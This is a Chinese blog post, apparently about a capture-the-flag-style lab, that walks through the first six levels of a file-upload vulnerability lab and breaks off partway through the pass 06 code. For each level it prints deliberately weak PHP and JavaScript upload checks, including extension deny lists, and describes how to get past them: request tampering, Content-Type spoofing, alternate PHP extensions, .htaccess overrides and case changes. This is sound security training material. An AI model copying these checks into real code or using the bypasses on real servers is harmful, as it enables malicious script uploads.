@@ -1,0 +1,918 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,文件上传," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 写在前面之前github上有个人总结了上传的漏洞类型，欠了好久，现在来补作业了。 0x02 开始做题pass 01代码分析从代码来看，第一关的校验是上传校验的方法是前端js校验。 12345678910111213141516171819&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;    function checkFile() &amp;#12">
+<meta name="keywords" content="php,文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传漏洞writeup">
+<meta property="og:url" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/index.html">
+<meta property="og:site_name" content="l1nk3r&#39;s blog">
+<meta property="og:description" content="0x01 写在前面之前github上有个人总结了上传的漏洞类型，欠了好久，现在来补作业了。 0x02 开始做题pass 01代码分析从代码来看，第一关的校验是上传校验的方法是前端js校验。 12345678910111213141516171819&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;    function checkFile() &amp;#12">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528721457500.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528721492517.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528721722989.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528722016405.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528722684396.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528722727564.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528722752666.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528723232370.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528723272151.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528723302081.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528723488046.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528724038572.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528724105005.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528724485500.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528725280932.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528725632302.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528725643907.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528726167223.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528726416416.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528726904003.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528726942666.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528727255867.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528727439843.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528727465967.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528727493223.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528806906184.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528807062589.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528807332043.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528808043799.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528808124612.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528808740705.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528809245482.png">
+<meta property="og:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528809572834.png">
+<meta property="og:updated_time" content="2018-06-12T13:29:07.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件上传漏洞writeup">
+<meta name="twitter:description" content="0x01 写在前面之前github上有个人总结了上传的漏洞类型，欠了好久，现在来补作业了。 0x02 开始做题pass 01代码分析从代码来看，第一关的校验是上传校验的方法是前端js校验。 12345678910111213141516171819&amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;    function checkFile() &amp;#12">
+<meta name="twitter:image" content="http://yoursite.com/2018/06/12/文件上传漏洞writeup/1528721457500.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/06/12/文件上传漏洞writeup/"/>
+
+
+
+
+
+  <title>文件上传漏洞writeup | l1nk3r's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l1nk3r's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/12/文件上传漏洞writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="l1nk3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1nk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件上传漏洞writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-12T21:27:09+08:00">
+                2018-06-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
+                    <span itemprop="name">WriteUp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>之前github上有个人总结了上传的漏洞类型，欠了好久，现在来补作业了。</p>
+<h1 id="0x02-开始做题"><a href="#0x02-开始做题" class="headerlink" title="0x02 开始做题"></a>0x02 开始做题</h1><h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass 01"></a>pass 01</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>从代码来看，第一关的校验是上传校验的方法是前端js校验。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    function checkFile() &#123;</span><br><span class="line">        var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;</span><br><span class="line">        if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">            alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        //定义允许上传的文件类型</span><br><span class="line">        var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">        //提取上传文件的类型</span><br><span class="line">        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">        //判断上传文件类型是否允许上传</span><br><span class="line">        if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class="line">            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>新建一个phpinfo.jpg的文件，直接上传通过前端js校验，然后通过burp抓包修改成php。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528721457500.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528721492517.png" alt="img"></p>
+<h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass 02"></a>pass 02</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>第二关主要是针对数据包的MIME进行检查，当然数据包传输过程中是不可信的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;文件类型不正确，请重新上传！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.&apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-1"><a href="#解题方法-1" class="headerlink" title="解题方法"></a>解题方法</h3><p>将数据包中的Content-Type修改为image/jpeg，image/png，image/gif</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528721722989.png" alt="img"></p>
+<h2 id="pass-03"><a href="#pass-03" class="headerlink" title="pass 03"></a>pass 03</h2><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>从第三关代码来看，代码设置了黑名单，禁止上传.asp,.aspx,.php,.jsp。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&apos;.asp&apos;,&apos;.aspx&apos;,&apos;.php&apos;,&apos;.jsp&apos;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR. &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .&apos;/&apos;. $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;不允许上传.asp,.aspx,.php,.jsp后缀文件！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-2"><a href="#解题方法-2" class="headerlink" title="解题方法"></a>解题方法</h3><p>由于是黑名单，因此存在后缀名校验不当导致绕过的问题，例如.phtml,.php3,.php5在某些环境下也能够解析</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528722016405.png" alt="img"></p>
+<p>还有种办法就是在apache，可以通过重写<code>.htaccess</code> 规则来绕过</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528722684396.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528722727564.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528722752666.png" alt="img"></p>
+<h2 id="pass-04"><a href="#pass-04" class="headerlink" title="pass 04"></a>pass 04</h2><h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p>第四关与第三关的差别就是好像后缀名过滤的有点多了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传!&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-3"><a href="#解题方法-3" class="headerlink" title="解题方法"></a>解题方法</h3><p>由于我们的环境中间件是apache，所以这里使用<code>.htaccess</code>绕过会比较舒服点。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528723232370.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528723272151.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528723302081.png" alt="img"></p>
+<h2 id="pass-05"><a href="#pass-05" class="headerlink" title="pass 05"></a>pass 05</h2><h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p>从代码来看第五关与第四关的差别是在于<code>$file_ext = strtolower($file_ext)</code>。并没有针对后缀名做同一大小写转换。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-4"><a href="#解题方法-4" class="headerlink" title="解题方法"></a>解题方法</h3><p>所以这里很简单，直接大小写就可以绕过了。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528723488046.png" alt="img"></p>
+<h2 id="pass-06"><a href="#pass-06" class="headerlink" title="pass 06"></a>pass 06</h2><h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><p>这里第六关的代码其实和第四关的有点像，但是不同点在于</p>
+<p><code>$file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</code></p>
+<p><code>trim()</code>的作用去除字符串首尾处的空白字符（或者其他字符）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, 